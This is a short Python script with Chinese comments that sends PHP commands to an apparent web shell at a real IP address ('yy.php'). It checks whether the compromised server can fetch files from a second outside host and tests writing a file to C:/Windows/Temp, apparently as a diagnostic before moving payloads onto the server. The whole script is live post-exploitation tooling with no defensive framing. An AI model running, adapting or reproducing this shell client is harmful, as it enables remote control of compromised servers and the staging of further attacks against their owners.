#!/usr/bin/env python3
"""诊断 81.70 -> 165 连通性 + allow_url_fopen"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=60)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

# 1. allow_url_fopen 状态
r = cmd('echo "fopen:" . ini_get("allow_url_fopen") . "|curl:" . (function_exists("curl_init")?"Y":"N") . "|timeout:" . ini_get("max_execution_time");')
print("1. 配置:", r.strip()[-100:], flush=True)
# 2. 小文件连通性 (165上放个标记文件)
r = cmd('echo "SMALL:" . file_get_contents("http://165.99.43.145:9124/mark.txt");')
print("2. 小文件:", r.strip()[-100:], flush=True)
# 3. 本地写测试
r = cmd('echo "WR:" . var_export(file_put_contents("C:/Windows/Temp/mark2.txt", "OK"), true);')
print("3. 本地写:", r.strip()[-100:], flush=True)
